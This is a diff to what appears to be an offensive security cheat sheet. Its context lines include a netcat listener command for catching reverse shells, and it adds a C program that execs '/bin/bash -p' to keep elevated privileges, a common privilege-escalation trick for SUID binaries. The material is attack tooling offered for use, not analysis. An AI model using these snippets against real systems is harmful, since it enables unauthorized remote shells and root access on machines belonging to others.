@@ -13,6 +13,17 @@ This adds up/down/left/right functionality!
 rlwrap nc -lvp [PORT]
 ```
 
+Bash in an exec
+```
+#include <stdio.h>
+#include <unistd.h>
+
+int main (void) {
+    char *argv[] = { "/bin/bash", "-p", NULL };
+    execve(argv[0], argv, NULL);
+}
+```
+
 
 ````
 JSP / tomcat WAR 
